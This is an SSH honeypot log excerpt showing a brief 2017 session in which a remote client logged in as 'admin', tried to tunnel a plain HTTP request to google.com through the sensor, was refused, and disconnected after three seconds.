+2017-04-11T09:04:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,104054,185.145.252.26] got channel 'direct-tcpip' request
+2017-04-11T09:04:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,104054,185.145.252.26] direct-tcp connection request to google.com:80 from localhost:8080
+2017-04-11T09:04:52+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104054,185.145.252.26] direct-tcp forward to google.com:80 with data 'GET /\r\n'
+2017-04-11T09:04:52+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104054,185.145.252.26] failed to connect: Connection refused
+2017-04-11T09:04:52+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104054,185.145.252.26] sending close 0
+2017-04-11T09:04:52+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104054,185.145.252.26] remote eof
+2017-04-11T09:04:52+0000 [HoneyPotSSHTransport,104054,185.145.252.26] avatar admin logging out
+2017-04-11T09:04:52+0000 [HoneyPotSSHTransport,104054,185.145.252.26] connection lost
+2017-04-11T09:04:52+0000 [HoneyPotSSHTransport,104054,185.145.252.26] Connection lost after 3 seconds
